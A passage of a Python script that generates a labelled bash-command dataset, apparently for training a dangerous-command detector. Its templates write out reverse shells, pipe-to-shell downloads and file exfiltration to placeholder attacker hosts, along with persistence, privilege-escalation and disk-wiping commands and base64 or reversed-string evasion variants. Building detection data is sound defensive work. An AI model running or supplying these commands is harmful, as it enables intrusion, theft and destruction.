    lambda: mkrec("chmod 777 /etc/sudoers", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec("chmod 777 /etc/passwd", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec("chmod 777 /root", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec("chown root:root /home/user", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec("chmod u+s /bin/bash", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec("chmod u+s /bin/sh", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec("chmod 4755 /tmp/script", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec("sudo su -", 1, "high", "privesc", "synthetic_dangerous"),
    lambda: mkrec("sudo -i", 1, "high", "privesc", "synthetic_dangerous"),
    lambda: mkrec("su -", 1, "high", "privesc", "synthetic_dangerous"),
    lambda: mkrec("su root", 1, "high", "privesc", "synthetic_dangerous"),
    lambda: mkrec("sudo su root", 1, "high", "privesc", "synthetic_dangerous"),
    lambda: mkrec("echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec("python -c 'import pty; pty.spawn(\"/bin/bash\")'", 1, "critical", "privesc", "synthetic_dangerous"),
    # Persistence
    lambda: mkrec("echo '*/5 * * * * root curl http://evil.com/backdoor | bash' > /etc/cron.d/evil", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec("systemctl enable malicious.service", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec("systemctl enable backdoor.timer", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec("echo 'nc -e /bin/bash attacker.com 4444 &' >> ~/.bashrc", 1, "medium", "persistence", "synthetic_dangerous"),
    lambda: mkrec("echo 'curl http://evil.com/backdoor | bash' >> ~/.profile", 1, "medium", "persistence", "synthetic_dangerous"),
    lambda: mkrec("echo 'alias sudo=\"/tmp/fake_sudo\"' >> ~/.bashrc", 1, "medium", "persistence", "synthetic_dangerous"),
    lambda: mkrec("echo 'ssh-rsa AAAAB3NzaC1yc2E... attacker' >> ~/.ssh/authorized_keys", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec("curl https://evil.com/key.pub >> ~/.ssh/authorized_keys", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec("wget -O- https://evil.com/id_rsa.pub >> ~/.ssh/authorized_keys", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec("cp /tmp/backdoor /etc/init.d/network-service && update-rc.d network-service defaults", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec("echo \"echo 'evil'\" > /etc/rc.local", 1, "high", "persistence", "synthetic_dangerous"),
    # Reconnaissance
    lambda: mkrec("find / -perm -4000 -type f 2>/dev/null", 1, "medium", "recon", "synthetic_dangerous"),
    lambda: mkrec("cat /etc/shadow", 1, "low", "recon", "synthetic_dangerous"),
    lambda: mkrec("cat /etc/sudoers", 1, "low", "recon", "synthetic_dangerous"),
    lambda: mkrec("cat /proc/self/environ 2>/dev/null", 1, "low", "recon", "synthetic_dangerous"),
    lambda: mkrec("nmap -sP 192.168.1.0/24", 1, "medium", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"nmap -sS -sV -O {pick(NET_RANGES)}", 1, "medium", "recon", "synthetic_dangerous"),
    lambda: mkrec("nmap -p- 192.168.1.100", 1, "medium", "recon", "synthetic_dangerous"),
    lambda: mkrec("masscan 10.0.0.0/8 -p22,80,443,8080 --rate=1000", 1, "medium", "recon", "synthetic_dangerous"),
    lambda: mkrec("grep -r 'password' /etc/ 2>/dev/null", 1, "high", "recon", "synthetic_dangerous"),
    lambda: mkrec("grep -r 'secret' /home/ 2>/dev/null", 1, "high", "recon", "synthetic_dangerous"),
    lambda: mkrec("mysqldump -u root -p --all-databases > /tmp/db_dump.sql", 1, "high", "recon", "synthetic_dangerous"),
    lambda: mkrec("pg_dumpall -U postgres > /tmp/pg_dump.sql", 1, "high", "recon", "synthetic_dangerous"),
    # More destructive variations
    lambda: mkrec(f"rm -rf {pick(['/var/log','/var/log/*','/var/log/nginx','/var/log/apache2','/var/log/mysql','/var/log/postgresql','/var/log/journal','/var/log/syslog','/var/log/messages','/var/log/secure','/var/log/auth.log','/var/log/kern.log','/var/log/dmesg','/var/log/boot.log','/var/log/lastlog','/var/log/wtmp','/var/log/btmp'])}", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"rm -rf {pick(['/etc/nginx','/etc/apache2','/etc/ssl','/etc/ssh','/etc/docker','/etc/mysql','/etc/postgresql','/etc/redis','/etc/systemd','/etc/sysconfig','/etc/default','/etc/cron.d','/etc/cron.daily','/etc/cron.hourly','/etc/cron.weekly','/etc/cron.monthly','/etc/init.d','/etc/rc.d','/etc/rc.local'])}", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"rm -rf {pick(['/var/www','/var/www/html','/var/www/html/*','/opt/app','/opt/app/*','/home/user/*','/home/user/.ssh','/home/user/.git','/home/user/.config','/home/user/.local','/usr/share','/usr/local','/usr/lib','/usr/include'])}", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"dd if=/dev/urandom of={pick(['/dev/sda','/dev/sda1','/dev/sdb','/dev/sdb1','/dev/sdc','/dev/mmcblk0'])} bs={pick(['1M','4M','8M'])} count={random.randint(10,1000)}", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"cat {pick(['/dev/sda','/dev/sda1','/dev/sdb','/dev/mmcblk0','/dev/nvme0n1'])} > {pick(['/dev/null','/tmp/loot','/dev/stdout'])}", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"shred -n {random.randint(1,10)} -z -u {pick(CRITICAL_FILES)}", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"shred -f {pick(['/etc/passwd','/etc/shadow','/etc/sudoers','/bin/bash','/sbin/init','/boot/vmlinuz'])}", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"dd if=/dev/zero of=/tmp/swapfile bs=1M count=1000 && swapon /tmp/swapfile", 1, "medium", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"echo 1 > /proc/sys/vm/drop_caches", 1, "medium", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"echo 3 > /proc/sys/vm/drop_caches", 1, "medium", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"mv {pick(['/bin/bash','/bin/sh','/bin/ls','/bin/cp','/bin/mv','/bin/rm','/sbin/init','/sbin/shutdown','/sbin/reboot','/usr/bin/python','/usr/bin/perl','/usr/bin/git'])} /dev/null", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"ln -sf /dev/null {pick(['/etc/passwd','/etc/shadow','/etc/sudoers','/etc/hosts','/etc/hostname','/etc/resolv.conf'])}", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"> {pick(['/etc/passwd','/etc/shadow','/etc/sudoers','/etc/ssh/ssh_config','/etc/fstab','/etc/hosts','/etc/resolv.conf','/var/log/auth.log','/var/log/syslog'])}", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f":(){{ :|:& }};: &", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"while true; do {pick(['mkdir /tmp/x','touch /tmp/x','fork()','dd if=/dev/zero of=/tmp/x'])}; done", 1, "high", "destructive", "synthetic_dangerous"),
    # More exfiltration variations
    lambda: mkrec(f"curl -s -o /dev/null --connect-timeout 5 http://{pick(EVIL_DOMAINS)}/beacon && {pick(['bash -i >& /dev/tcp/{pick(ATTACKER_IPS)}/{pick(ATTACKER_PORTS)} 0>&1', 'wget -qO- http://{pick(EVIL_DOMAINS)}/stage2 | bash', 'curl http://{pick(EVIL_DOMAINS)}/stage2 | sh'])}", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"curl -s -k https://{pick(EVIL_DOMAINS)}/cert && openssl s_client -connect {pick(ATTACKER_IPS)}:{pick(ATTACKER_PORTS)} 2>/dev/null", 1, "high", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"python3 -c 'import socket;s=socket.socket();s.connect((\"{pick(ATTACKER_IPS)}\",{pick(ATTACKER_PORTS)}));[os.dup2(s.fileno(),f)for f in(0,1,2)];import pty;pty.spawn(\"/bin/sh\")'", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"php -r '$s=fsockopen(\"{pick(ATTACKER_IPS)}\",{pick(ATTACKER_PORTS)});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"perl -e 'use Socket;$i=\"{pick(ATTACKER_IPS)}\";$p={pick(ATTACKER_PORTS)};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"ruby -rsocket -e 'c=TCPSocket.new(\"{pick(ATTACKER_IPS)}\",{pick(ATTACKER_PORTS)});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"lua -e 'local s=require(\"socket\");local t=s.tcp();t:connect(\"{pick(ATTACKER_IPS)}\",{pick(ATTACKER_PORTS)});while true do local r,x=t:receive();local f=io.popen(r,\"r\");local b=f:read(\"*a\");t:send(b);end'", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"curl -s http://{pick(EVIL_DOMAINS)}/payload.py | python3", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"wget -q http://{pick(EVIL_DOMAINS)}/backdoor.pl -O /tmp/bd.pl && perl /tmp/bd.pl", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"curl -s http://{pick(EVIL_DOMAINS)}/payload.rb | ruby", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"curl -s http://{pick(EVIL_DOMAINS)}/script.php | php", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"curl -X POST --data-urlencode 'data@/etc/passwd' http://{pick(EVIL_DOMAINS)}/collect", 1, "high", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"curl -X POST --data-urlencode 'data@/etc/shadow' http://{pick(EVIL_DOMAINS)}/exfil", 1, "high", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"curl -X POST --data-urlencode 'data@/home/user/.ssh/id_rsa' http://{pick(EVIL_DOMAINS)}/steal", 1, "high", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"tar czvf - /etc/passwd /etc/shadow /home/user/.ssh 2>/dev/null | curl -X POST --data-binary @- http://{pick(EVIL_DOMAINS)}/exfil", 1, "high", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"zip -r /tmp/exfil.zip /etc/passwd /etc/shadow 2>/dev/null && curl -F 'file=@/tmp/exfil.zip' http://{pick(EVIL_DOMAINS)}/upload", 1, "high", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"gpg --symmetric --passphrase 'hack' /tmp/steal.tgz && curl -F 'file=@/tmp/steal.tgz.gpg' http://{pick(EVIL_DOMAINS)}/drop", 1, "high", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"socat TCP:{pick(ATTACKER_IPS)}:{pick(ATTACKER_PORTS)} EXEC:/bin/sh", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"socat EXEC:/bin/bash TCP:{pick(ATTACKER_IPS)}:{pick(ATTACKER_PORTS)}", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"telnet {pick(ATTACKER_IPS)} {pick(ATTACKER_PORTS)} | /bin/bash | telnet {pick(ATTACKER_IPS)} {pick(ATTACKER_PORTS)}", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"ncat {pick(ATTACKER_IPS)} {pick(ATTACKER_PORTS)} -e /bin/bash", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"ncat -lvp {pick([4444,5555,6666,7777,8888,9999,1337,31337,9001])} -e /bin/bash &", 1, "high", "exfiltration", "synthetic_dangerous"),
    # More privesc
    lambda: mkrec(f"chmod 4755 {pick(['/bin/bash','/bin/sh','/bin/dash','/bin/zsh','/usr/bin/python','/usr/bin/sudo','/usr/bin/pkexec','/tmp/exploit'])}", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec(f"chmod 777 {pick(['/etc/environment','/etc/profile','/etc/bash.bashrc','/etc/bashrc','/etc/zshrc','/etc/zprofile','/root/.bashrc','/root/.profile','/root/.ssh'])}", 1, "high", "privesc", "synthetic_dangerous"),
    lambda: mkrec(f"chown -R 0:0 {pick(['/home/user','/tmp/exploit','/opt/app','/var/www'])}", 1, "high", "privesc", "synthetic_dangerous"),
    lambda: mkrec(f"chmod 666 /etc/{pick(['shadow','sudoers','passwd','gshadow','group','sudoers.d/sudoers'])}", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec(f"echo '{pick(['user','admin','root','test'])}:{pick(['$6$xyz','$1$abc','$5$def'])}:0:0:root:/root:/bin/bash' >> /etc/passwd", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec(f"echo '{pick(['user','admin','test'])}::0:0:root:/root:/bin/bash' >> /etc/passwd", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec(f"usermod -aG sudo {pick(['user','admin','www-data','postgres'])}", 1, "high", "privesc", "synthetic_dangerous"),
    lambda: mkrec(f"useradd -ou 0 -g 0 {pick(['backup','admin','operator','support'])} && passwd -d {pick(['backup','admin','operator','support'])}", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec(f"echo '{pick(['user','admin','test'])} ALL=(ALL) NOPASSWD: ALL' | tee -a /etc/sudoers", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec(f"echo '{pick(['user','admin','test'])} ALL=(ALL:ALL) ALL' | tee -a /etc/sudoers.d/{pick(['admin','sudoers','90-user'])}", 1, "critical", "privesc", "synthetic_dangerous"),
    lambda: mkrec(f"pkexec /bin/sh", 1, "high", "privesc", "synthetic_dangerous"),
    lambda: mkrec(f"sudo pkexec /bin/sh", 1, "high", "privesc", "synthetic_dangerous"),
    lambda: mkrec(f"cp /bin/bash /tmp/setuidbash && chmod 4755 /tmp/setuidbash", 1, "critical", "privesc", "synthetic_dangerous"),
    # More persistence
    lambda: mkrec(f"(crontab -l 2>/dev/null; echo '*/{pick([5,10,15,30,60])} * * * * curl http://{pick(EVIL_DOMAINS)}/checkin | bash') | crontab -", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"(crontab -l 2>/dev/null; echo '@reboot /home/user/.hidden/backdoor.sh') | crontab -", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"echo '*/{pick([5,10,15,30])} * * * * root /tmp/.system-update' >> /etc/crontab", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"mkdir -p /etc/systemd/system/ssh.service.d && echo -e '[Service]\\nExecStartPre=/tmp/backdoor' > /etc/systemd/system/ssh.service.d/override.conf && systemctl daemon-reload", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"cp /tmp/backdoor /usr/lib/systemd/systemd-update && chmod +x /usr/lib/systemd/systemd-update", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"echo 'alias ssh=\"/tmp/ssh-hook\"' >> /etc/profile", 1, "medium", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"echo 'export LD_PRELOAD=/tmp/hook.so' >> /etc/environment", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"echo '/tmp/backdoor.sh &' >> /etc/rc.local && chmod +x /etc/rc.local", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"printf '#!/bin/sh\\n/tmp/.watchdog &\\n' > /etc/rc.local && chmod +x /etc/rc.local", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"cat > /lib/systemd/system/system-update.service << 'EOF'\\n[Service]\\nExecStart=/tmp/update\\n[Install]\\nWantedBy=multi-user.target\\nEOF && systemctl enable system-update.service", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"mkdir -p ~/.ssh && curl -o ~/.ssh/authorized_keys2 http://{pick(EVIL_DOMAINS)}/key.pub", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"echo 'command=\"/tmp/backdoor\" ssh-rsa AAAAB3Nza...' >> ~/.ssh/authorized_keys", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"echo '*/5 * * * * /home/user/.cache/.daemon' | crontab -", 1, "high", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"nohup {pick(['/tmp/backdoor', '/tmp/.systemd', '/home/user/.cache/update'])} &", 1, "medium", "persistence", "synthetic_dangerous"),
    lambda: mkrec(f"echo '0 */6 * * * root /tmp/cleanup.sh && curl http://{pick(EVIL_DOMAINS)}/beacon' >> /etc/crontab", 1, "high", "persistence", "synthetic_dangerous"),
    # More recon
    lambda: mkrec(f"curl -s http://{pick(['169.254.169.254','169.254.169.254/latest/meta-data/','100.100.100.200','100.100.100.200/latest/meta-data/','192.168.1.1','10.0.0.1'])} 2>/dev/null", 1, "high", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"cat {pick(['/proc/1/environ','/proc/self/environ','/proc/self/fd/0','/proc/self/fd/1','/proc/self/fd/2','/proc/self/mounts','/proc/self/cgroup','/proc/1/cgroup','/proc/version','/proc/cpuinfo','/proc/meminfo','/proc/partitions','/proc/mounts','/proc/net/tcp','/proc/net/udp','/proc/net/arp'])} 2>/dev/null", 1, "medium", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"ls -la {pick(['/root','/home','/home/user/.ssh','/home/user/.aws','/home/user/.config','/etc/ssh','/etc/ssl','/etc/kubernetes','/var/spool/mail','/var/mail','/opt','/srv'])} 2>/dev/null", 1, "low", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"find / -name '{pick(['id_rsa','id_dsa','*.pem','*.key','*.p12','credentials','credentials.json','config.json','token','secret','password','*.env','.env','.git-credentials','authorized_keys','known_hosts','kubeconfig','.kube/config','.docker/config.json','.npmrc','netrc','.netrc'])}' 2>/dev/null", 1, "high", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"nmap -sV -sC -O {pick(['192.168.1.0/24','10.0.0.0/24','172.16.0.0/24','10.10.10.0/24','192.168.0.0/24','10.0.0.0/8'])}", 1, "medium", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"nmap -p 1-65535 -T4 {pick(ATTACKER_IPS)}", 1, "medium", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"nc -zvn {pick(['192.168.1.1','10.0.0.1','172.16.0.1','10.10.10.1'])} {pick(['22','80','443','8080','3306','5432','6379','27017','9200','5601','9090','3000'])}", 1, "low", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"curl -s http://{pick(['192.168.1.1:8080','10.0.0.1:3000','192.168.1.1:9200','10.0.0.1:5601','172.16.0.1:9090','10.10.10.1:8080'])}/actuator/{pick(['health','info','env','beans','mappings','metrics','configprops','loggers','heapdump','threaddump','prometheus'])}", 1, "medium", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"curl -s -X POST -H 'Content-Type: application/json' -d '{{\"username\":\"{pick(['admin','root','user','test'])}\",\"password\":\"{pick(['admin','password','123456','test','root','toor'])}\"}}' http://{pick(['192.168.1.1:8080/login','10.0.0.1:3000/auth','192.168.1.1:8000/api/login','10.0.0.1:443/login'])}", 1, "medium", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {pick(['root','admin','user','test','pi','ubuntu','ec2-user','debian'])}@{pick(['192.168.1.1','10.0.0.1','172.16.0.1','10.10.10.1'])} 'id' 2>/dev/null", 1, "medium", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"for ip in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$ip & done", 1, "low", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"for ip in $(seq 1 254); do (echo '' | nc -w 1 10.0.0.$ip 22 2>/dev/null && echo 'SSH on 10.0.0.'$ip) & done", 1, "medium", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"arp -a", 1, "low", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"route -n", 1, "low", "recon", "synthetic_dangerous"),
    lambda: mkrec(f"ifconfig -a", 1, "low", "recon", "synthetic_dangerous"),
]

# ---------------------------------------------------------------------------
# Adversarial variant generators
# ---------------------------------------------------------------------------
def make_adversarial_variants(rec):
    """Generate 1-4 obfuscated variants for a given command record."""
    variants = []
    cmd = rec["command"]
    label = rec["label"]
    severity = rec["severity"]
    category = rec["category"]
    
    # 1. Base64 encode whole command
    if len(cmd) < 200 and not cmd.startswith("echo") and "base64" not in cmd:
        b64 = encode_b64(cmd)
        variants.append(mkrec(b64, label, severity, category, "adversarial", "base64"))
        variants.append(mkrec(f"echo '{b64}' | base64 -d | sh", label, severity, category, "adversarial", "base64"))
    
    # 2. Comment injection
    if "#" not in cmd:
        variants.append(mkrec(f"{cmd} # cleaned", label, severity, category, "adversarial", "comment_injection"))
        variants.append(mkrec(f"{cmd} # safe operation", label, severity, category, "adversarial", "comment_injection"))
    
    # 3. Chaining with safe prefix
    if "&&" not in cmd and ";" not in cmd:
        prefix = pick(SAFE_ECHO_PREFIXES)
        variants.append(mkrec(f"{prefix}{cmd}", label, severity, category, "adversarial", "chaining_safe_prefix"))
        variants.append(mkrec(f"{cmd} && echo 'done'", label, severity, category, "adversarial", "chaining_safe_suffix"))
    
    # 4. Heredoc wrapping
    if 10 < len(cmd) < 100:
        marker = pick(["EOF", "SCRIPT", "END"])
        variants.append(mkrec(f"cat <<'{marker}' | sh\n{cmd}\n{marker}", label, severity, category, "adversarial", "heredoc"))
    
    # 5. Wildcard obfuscation (destructive rm)
    if "rm -rf /" in cmd:
        variants.append(mkrec("rm -rf /*.*", label, severity, category, "adversarial", "wildcard_obfuscation"))
        variants.append(mkrec("rm -rf /???", label, severity, category, "adversarial", "wildcard_obfuscation"))
    
    # 6. Variable substitution
    if "/" in cmd and "$" not in cmd and len(cmd) < 100:
        parts = cmd.split()
        new_parts = []
        for part in parts:
            if part.startswith("/") and len(part) > 2:
                new_parts.append(f"${{{pick(['DIR','HOME','TARGET','ROOT'])}}}")
            else:
                new_parts.append(part)
        if new_parts != parts:
            variants.append(mkrec(" ".join(new_parts), label, severity, category, "adversarial", "variable_substitution"))
    
    # 7. Reverse string
    if len(cmd.split()) <= 4 and 5 < len(cmd) < 50:
        rev = cmd[::-1]
        variants.append(mkrec(f"echo '{rev}' | rev | sh", label, severity, category, "adversarial", "reverse_string"))
    
    # Deduplicate by command text
    seen = set()
    out = []
    for v in variants:
        if v["command"] not in seen and v["command"] != cmd:
            seen.add(v["command"])
            out.append(v)
    return out[:5]


def make_safe_adversarial(rec):
    """Generate variants of safe commands that look dangerous but are safe."""
    variants = []
    cmd = rec["command"]
    
    # Quoted dangerous-looking args
    if "rm -rf" in cmd:
        variants.append(mkrec(cmd.replace("rm -rf", "rm '-rf'"), 0, None, "safe_quoted", "adversarial", "quoted_arguments"))
    
    # Echo the dangerous command as a string
    if any(kw in cmd for kw in ["rm", "dd", "mkfs", "chmod", "shutdown", "reboot"]):
        variants.append(mkrec(f"echo \"{cmd}\"", 0, None, "safe_echo", "adversarial", "echoed_command"))
    
    # Dry-run flag
    if "rm " in cmd and "--dry-run" not in cmd:
        variants.append(mkrec(cmd.replace("rm ", "rm --dry-run "), 0, None, "safe_dryrun", "adversarial", "dry_run"))
    
    return variants


# ---------------------------------------------------------------------------
# Generation
# ---------------------------------------------------------------------------
def generate_commands(builders, target, source_name):
    """Generate up to `target` unique commands using builder lambdas."""
    seen = set()
    out = []
    attempts = 0
    max_attempts = target * 8  # generous budget for collisions
    
    while len(out) < target and attempts < max_attempts:
        attempts += 1
        builder = pick(builders)
        rec = builder()
        if rec["command"] not in seen:
            seen.add(rec["command"])
            out.append(rec)
    
    if len(out) < target:
        print(f"  (Note: only reached {len(out)}/{target} unique commands after {attempts} attempts)")
    return out


def generate_dataset():
    print("=" * 60)
    print("BASH COMMAND DATASET GENERATOR (Phase 3)")
    print("=" * 60)
    
    # ---- Step 1a: Generate benign commands ----
    print(f"\n[1a] Generating {TARGET_BENIGN}+ benign commands...")
    benign = generate_commands(BENIGN_BUILDERS, TARGET_BENIGN, "synthetic_benign")
    random.shuffle(benign)
    print(f"  Generated {len(benign)} unique benign commands")
    with open(OUT_BENIGN, "w") as f:
        for rec in benign:
            f.write(json.dumps(rec) + "\n")
    print(f"  Saved to {OUT_BENIGN}")
    
    # ---- Step 1b: Generate dangerous commands ----
    print(f"\n[1b] Generating {TARGET_DANGEROUS}+ dangerous commands...")
    dangerous = generate_commands(DANGEROUS_BUILDERS, TARGET_DANGEROUS, "synthetic_dangerous")
    random.shuffle(dangerous)
    print(f"  Generated {len(dangerous)} unique dangerous commands")
    with open(OUT_DANGEROUS, "w") as f:
        for rec in dangerous:
            f.write(json.dumps(rec) + "\n")
    print(f"  Saved to {OUT_DANGEROUS}")
    
    # ---- Step 1c: Generate adversarial variants ----
    print(f"\n[1c] Generating adversarial variants...")
    adversarial = []
    
    # Add adversarial variants for dangerous commands
    for rec in dangerous[:5000]:  # sample from dangerous
        adversarial.extend(make_adversarial_variants(rec))
    
    # Add safe adversarial variants for benign commands
    for rec in benign[:3000]:
        adversarial.extend(make_safe_adversarial(rec))
    
    # More base64 variants directly from dangerous commands
    for rec in dangerous[:2000]:
        cmd = rec["command"]
        if len(cmd) < 200 and "base64" not in cmd:
            b64 = encode_b64(cmd)
            adversarial.append(mkrec(f"echo '{b64}' | base64 -d | sh", 1, rec["severity"],
                                    "adversarial", "adversarial", "base64"))
    
    random.shuffle(adversarial)
    # Deduplicate adversarial
    seen = set()
    adv_deduped = []
    for rec in adversarial:
        if rec["command"] not in seen:
            seen.add(rec["command"])
            adv_deduped.append(rec)
    adversarial = adv_deduped
    print(f"  Generated {len(adversarial)} unique adversarial variants")
    with open(OUT_ADVERSARIAL, "w") as f:
        for rec in adversarial:
            f.write(json.dumps(rec) + "\n")
    print(f"  Saved to {OUT_ADVERSARIAL}")
    
    # ---- Step 1d: Merge and deduplicate ----
    print("\n[1d] Merging and deduplicating...")
    all_records = benign + dangerous + adversarial
    random.shuffle(all_records)
    
    seen = set()
    deduped = []
    for rec in all_records:
        if rec["command"] not in seen:
            seen.add(rec["command"])
            deduped.append(rec)
    all_records = deduped
    print(f"  Total unique records: {len(all_records)}")
    
    with open(OUT_RAW, "w") as f:
        for rec in all_records:
            f.write(json.dumps(rec) + "\n")
    print(f"  Saved raw to {OUT_RAW}")
    
    with open(OUT_FULL, "w") as f:
        for rec in all_records:
            f.write(json.dumps(rec) + "\n")
    print(f"  Saved processed to {OUT_FULL}")
    
    # Summary
    benign_count = sum(1 for r in all_records if r["label"] == 0)
    dangerous_count = sum(1 for r in all_records if r["label"] == 1)
    print(f"\n{'='*60}")
    print("DATASET SUMMARY")
    print(f"{'='*60}")
    print(f"  Total commands:    {len(all_records)}")
    print(f"  Benign (label=0):  {benign_count} ({benign_count/len(all_records)*100:.1f}%)")
    print(f"  Dangerous (label=1): {dangerous_count} ({dangerous_count/len(all_records)*100:.1f}%)")
    
    cats = {}
    for rec in all_records:
        c = rec.get("category", "unknown")
        cats[c] = cats.get(c, 0) + 1
    print("\n  By category:")
    for c, n in sorted(cats.items(), key=lambda x: -x[1]):
        print(f"    {c}: {n}")
    
    print("\nDone! Dataset ready for splitting.")


if __name__ == "__main__":
    generate_dataset()
